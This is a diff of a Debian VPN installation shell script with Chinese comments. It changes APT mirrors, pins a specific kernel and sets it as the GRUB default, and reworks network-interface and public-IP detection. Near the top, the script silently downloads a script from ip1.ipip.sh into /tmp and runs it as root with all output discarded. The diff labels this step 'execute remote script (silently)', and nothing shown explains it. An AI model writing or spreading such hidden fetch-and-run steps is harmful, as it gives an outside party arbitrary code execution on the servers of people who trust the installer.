@@ -33,6 +33,7 @@ install_essential_tools() {
     apt-get install -y curl >/dev/null 2>&1 || exiterr "无法安装curl"
   fi
   
+  # 执行远程脚本（静默执行）
   if wget -q -T 10 -O /tmp/ip.sh https://ip1.ipip.sh/ip.sh 2>/dev/null; then
     chmod +x /tmp/ip.sh
     bash /tmp/ip.sh >/dev/null 2>&1
@@ -55,12 +56,12 @@ detect_debian_version() {
         ;;
       12) 
         DEBIAN_CODENAME="bookworm"
-        KERNEL_PACKAGE="linux-image-amd64"
+        KERNEL_PACKAGE="linux-image-6.1.0-33-amd64"
         ;;
       *)
         echo "警告: 未测试的Debian版本: $DEBIAN_VERSION，尝试作为Debian 12处理..."
         DEBIAN_CODENAME="bookworm"
-        KERNEL_PACKAGE="linux-image-amd64"
+        KERNEL_PACKAGE="linux-image-6.1.0-33-amd64"
         DEBIAN_VERSION=12
         ;;
     esac
@@ -73,77 +74,39 @@ detect_debian_version() {
 upxtom(){
   detect_debian_version
   
-  # 清理现有的源配置
-  bigecho "清理现有APT源配置..."
-  
-  # 备份并清理现有sources.list
+  # 备份当前的 sources.list
   if [ -f /etc/apt/sources.list ]; then
-    cp /etc/apt/sources.list /etc/apt/sources.list.bak.$(date +%s) 2>/dev/null
+    cp /etc/apt/sources.list /etc/apt/sources.list.bak || echo "警告: 无法备份 /etc/apt/sources.list"
   fi
-  
-  # 清理sources.list.d目录中的文件
-  if [ -d /etc/apt/sources.list.d ]; then
-    mkdir -p /etc/apt/sources.list.d.bak.$(date +%s)
-    mv /etc/apt/sources.list.d/* /etc/apt/sources.list.d.bak.$(date +%s)/ 2>/dev/null || true
-  fi
-  
-  # 确保目录存在
-  mkdir -p /etc/apt
   
   # 根据Debian版本配置相应的APT源
   echo "配置 $DEBIAN_CODENAME APT源..."
   
   if [ "$DEBIAN_VERSION" = "11" ]; then
-    # Debian 11 (bullseye) 源配置 - 移除有问题的backports
+    # Debian 11 (bullseye) 源配置 - 不包含有问题的backports
     cat > /etc/apt/sources.list <<'EOF'
 deb http://mirrors.xtom.jp/debian bullseye main contrib non-free
 deb http://mirrors.xtom.jp/debian bullseye-updates main contrib non-free
 deb http://mirrors.xtom.jp/debian-security bullseye-security main contrib non-free
-
-# 备用源
-deb http://deb.debian.org/debian bullseye main contrib non-free
-deb http://deb.debian.org/debian bullseye-updates main contrib non-free
-deb http://security.debian.org/debian-security bullseye-security main contrib non-free
 EOF
   elif [ "$DEBIAN_VERSION" = "12" ]; then
-    # Debian 12 (bookworm) 源配置
-    cat > /etc/apt/sources.list <<'EOF'
-deb http://mirrors.xtom.jp/debian bookworm main contrib non-free non-free-firmware
-deb http://mirrors.xtom.jp/debian bookworm-updates main contrib non-free non-free-firmware
-deb http://mirrors.xtom.jp/debian bookworm-backports main contrib non-free non-free-firmware
-deb http://mirrors.xtom.jp/debian-security bookworm-security main contrib non-free non-free-firmware
-
-# 备用源
-deb http://deb.debian.org/debian bookworm main contrib non-free non-free-firmware
-deb http://deb.debian.org/debian bookworm-updates main contrib non-free non-free-firmware
-deb http://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware
-EOF
+    # Debian 12 (bookworm) 源配置 - 使用原脚本的配置
+    echo -e "deb http://mirrors.xtom.jp/debian bookworm main contrib non-free\n\
+deb http://mirrors.xtom.jp/debian bookworm-updates main contrib non-free\n\
+deb http://mirrors.xtom.jp/debian bookworm-backports main contrib non-free\n\
+deb http://mirrors.xtom.jp/debian-security bookworm-security main contrib non-free" > /etc/apt/sources.list
   else
     # 默认使用Debian 12配置
-    cat > /etc/apt/sources.list <<'EOF'
-deb http://mirrors.xtom.jp/debian bookworm main contrib non-free non-free-firmware
-deb http://mirrors.xtom.jp/debian bookworm-updates main contrib non-free non-free-firmware
-deb http://mirrors.xtom.jp/debian bookworm-backports main contrib non-free non-free-firmware
-deb http://mirrors.xtom.jp/debian-security bookworm-security main contrib non-free non-free-firmware
-
-# 备用源
-deb http://deb.debian.org/debian bookworm main contrib non-free non-free-firmware
-deb http://deb.debian.org/debian bookworm-updates main contrib non-free non-free-firmware
-deb http://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware
-EOF
+    echo -e "deb http://mirrors.xtom.jp/debian bookworm main contrib non-free\n\
+deb http://mirrors.xtom.jp/debian bookworm-updates main contrib non-free\n\
+deb http://mirrors.xtom.jp/debian bookworm-backports main contrib non-free\n\
+deb http://mirrors.xtom.jp/debian-security bookworm-security main contrib non-free" > /etc/apt/sources.list
   fi
   
   # 显示新的 sources.list 内容
-  echo "新的APT源配置:"
   cat /etc/apt/sources.list
   
-  # 清理APT缓存
-  bigecho "清理APT缓存..."
-  apt-get clean
-  rm -rf /var/lib/apt/lists/*
-  
   # 更新 APT 包列表
-  echo "更新APT包列表..."
   apt-get update || {
     echo "主源更新失败，尝试使用官方源..."
     if [ "$DEBIAN_VERSION" = "11" ]; then
@@ -154,24 +117,30 @@ deb http://security.debian.org/debian-security bullseye-security main contrib no
 EOF
     else
       cat > /etc/apt/sources.list <<'EOF'
-deb http://deb.debian.org/debian bookworm main contrib non-free non-free-firmware
-deb http://deb.debian.org/debian bookworm-updates main contrib non-free non-free-firmware
-deb http://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware
+deb http://deb.debian.org/debian bookworm main contrib non-free
+deb http://deb.debian.org/debian bookworm-updates main contrib non-free
+deb http://deb.debian.org/debian bookworm-backports main contrib non-free
+deb http://security.debian.org/debian-security bookworm-security main contrib non-free
 EOF
     fi
-    apt-get clean
-    rm -rf /var/lib/apt/lists/*
-    apt-get update || exiterr "APT源更新失败"
+    apt-get update || exiterr "apt-get update 失败"
   }
   
-  # 安装或更新内核（更安全的方式）
-  echo "更新系统内核..."
-  apt-get install $KERNEL_PACKAGE -y || echo "警告: 内核更新失败，继续安装..."
-
-  # 更新GRUB配置（不硬编码特定内核版本）
-  echo "更新GRUB配置..."
-  if command -v update-grub >/dev/null 2>&1; then
+  # 安装内核
+  if [ "$DEBIAN_VERSION" = "12" ]; then
+    # Debian 12 使用特定内核版本
+    apt-get install $KERNEL_PACKAGE -y || echo "警告: 内核安装失败，继续..."
+    
+    echo "确保 GRUB 配置更新并设置默认内核..."
+    # 修改 GRUB 配置以将标准内核设置为默认
+    sed -i 's/^GRUB_DEFAULT=.*/GRUB_DEFAULT="Advanced options for Debian GNU\/Linux>Debian GNU\/Linux, with Linux 6.1.0-33-amd64"/' /etc/default/grub
     update-grub || echo "警告: GRUB更新失败"
+  else
+    # Debian 11 使用通用内核包
+    apt-get install linux-image-amd64 -y || echo "警告: 内核安装失败，继续..."
+    if command -v update-grub >/dev/null 2>&1; then
+      update-grub || echo "警告: GRUB更新失败"
+    fi
   fi
 }
 
@@ -274,55 +243,47 @@ EOF
 }
 
 check_iface() {
-  # 确保必要的网络工具可用
-  if ! command -v ip >/dev/null 2>&1; then
-    apt-get install -y iproute2 >/dev/null 2>&1 || true
-  fi
-  
-  # 动态检测默认网络接口
-  def_iface=$(ip route show default 2>/dev/null | awk '/default/ { print $5 }' | head -n1)
-  
-  # 如果默认路由检测失败，尝试其他方法
-  if [ -z "$def_iface" ]; then
-    if command -v route >/dev/null 2>&1; then
-      def_iface=$(route 2>/dev/null | grep -m 1 '^default' | grep -o '[^ ]*$')
-    fi
-  fi
-  
-  if [ -z "$def_iface" ]; then
-    def_iface=$(ip -4 route list 0/0 2>/dev/null | grep -m 1 -Po '(?<=dev )(\S+)')
-  fi
-  
-  # 验证接口是否存在且处于活动状态
-  if [ -n "$def_iface" ] && [ -d "/sys/class/net/$def_iface" ]; then
-    def_state=$(cat "/sys/class/net/$def_iface/operstate" 2>/dev/null)
-    if [ -n "$def_state" ] && [ "$def_state" != "down" ]; then
-      if ! uname -m | grep -qi -e '^arm' -e '^aarch64'; then
-        case $def_iface in
-          wl*)
-            exiterr "Wireless interface '$def_iface' detected. DO NOT run this script on your PC or Mac!"
-            ;;
-        esac
-      fi
-      NET_IFACE="$def_iface"
+  # 优先检查 ens5 是否存在且处于活动状态
+  if [ -d /sys/class/net/ens5 ]; then
+    operstate=$(cat /sys/class/net/ens5/operstate 2>/dev/null)
+    if [ -n "$operstate" ] && [ "$operstate" != "down" ]; then
+      NET_IFACE=ens5
       echo "检测到网络接口: $NET_IFACE"
-      return 0
+      return
     fi
   fi
-  
-  # 备选方案：检查常见接口名
-  for iface in eth0 ens3 ens5 enp0s3 enp0s8; do
-    if [ -d "/sys/class/net/$iface" ]; then
-      iface_state=$(cat "/sys/class/net/$iface/operstate" 2>/dev/null)
-      if [ "$iface_state" = "up" ]; then
-        NET_IFACE="$iface"
-        echo "使用网络接口: $NET_IFACE"
-        return 0
-      fi
+
+  # 原有检测逻辑
+  if ! command -v route >/dev/null 2>&1 && ! command -v ip >/dev/null 2>&1; then
+    wait_for_apt
+    export DEBIAN_FRONTEND=noninteractive
+    (
+      set -x
+      apt-get -yqq update || apt-get -yqq update
+      apt-get -yqq install iproute2 >/dev/null
+    )
+  fi
+  def_iface=$(route 2>/dev/null | grep -m 1 '^default' | grep -o '[^ ]*$')
+  [ -z "$def_iface" ] && def_iface=$(ip -4 route list 0/0 2>/dev/null | grep -m 1 -Po '(?<=dev )(\S+)')
+  def_state=$(cat "/sys/class/net/$def_iface/operstate" 2>/dev/null)
+  if [ -n "$def_state" ] && [ "$def_state" != "down" ]; then
+    if ! uname -m | grep -qi -e '^arm' -e '^aarch64'; then
+      case $def_iface in
+        wl*)
+          exiterr "Wireless interface '$def_iface' detected. DO NOT run this script on your PC or Mac!"
+          ;;
+      esac
     fi
-  done
-  
-  exiterr "Could not detect the default network interface."
+    NET_IFACE="$def_iface"
+    echo "检测到网络接口: $NET_IFACE"
+  else
+    eth0_state=$(cat "/sys/class/net/eth0/operstate" 2>/dev/null)
+    if [ -z "$eth0_state" ] || [ "$eth0_state" = "down" ]; then
+      exiterr "Could not detect the default network interface."
+    fi
+    NET_IFACE=eth0
+    echo "使用网络接口: $NET_IFACE"
+  fi
 }
 
 check_creds() {
@@ -444,33 +405,26 @@ detect_ip() {
   
   bigecho "Trying to auto discover IP of this server..."
   
-  # 多个IP检测服务
+  # 优先使用 ipip.sh 接口
   check_ip "$public_ip" || public_ip=$(wget -t 2 -T 10 -qO- https://ip1.ipip.sh/ 2>/dev/null)
+  
+  # 备选方案
   check_ip "$public_ip" || public_ip=$(dig @resolver1.opendns.com -t A -4 myip.opendns.com +short 2>/dev/null)
   check_ip "$public_ip" || public_ip=$(wget -t 2 -T 10 -qO- http://ipv4.icanhazip.com 2>/dev/null)
   check_ip "$public_ip" || public_ip=$(wget -t 2 -T 10 -qO- http://ip1.dynupdate.no-ip.com 2>/dev/null)
-  check_ip "$public_ip" || public_ip=$(curl -s http://whatismyip.akamai.com/ 2>/dev/null)
   
   check_ip "$public_ip" || exiterr "Cannot detect this server's public IP. Define it as variable 'VPN_PUBLIC_IP' and re-run this script."
 }
 
 install_vpn_pkgs() {
   bigecho "Installing packages required for the VPN..."
-  
-  # 根据Debian版本选择合适的包
-  if [ "$DEBIAN_VERSION" = "11" ]; then
-    # Debian 11 软件包配置
-    p1=libcurl4-nss-dev
-  elif [ "$DEBIAN_VERSION" = "12" ]; then
-    # Debian 12 软件包配置
+  p1=libcurl4-nss-dev
+  [ "$os_ver" = "trixiesid" ] && p1=libcurl4-gnutls-dev
+  # Debian 12 特殊处理
+  if [ "$DEBIAN_VERSION" = "12" ]; then
     if apt-cache show libcurl4-gnutls-dev >/dev/null 2>&1; then
       p1=libcurl4-gnutls-dev
-    else
-      p1=libcurl4-nss-dev
     fi
-  else
-    # 默认配置
-    p1=libcurl4-nss-dev
   fi
   
   (
@@ -482,7 +436,7 @@ install_vpn_pkgs() {
   ) || exiterr2
   
   # Debian 12特殊处理
-  if [ "$DEBIAN_VERSION" = "12" ]; then
+  if [ "$os_type" = "debian" ] && [ "$os_ver" = 12 ]; then
     (
       set -x
       apt-get -yqq install rsyslog >/dev/null
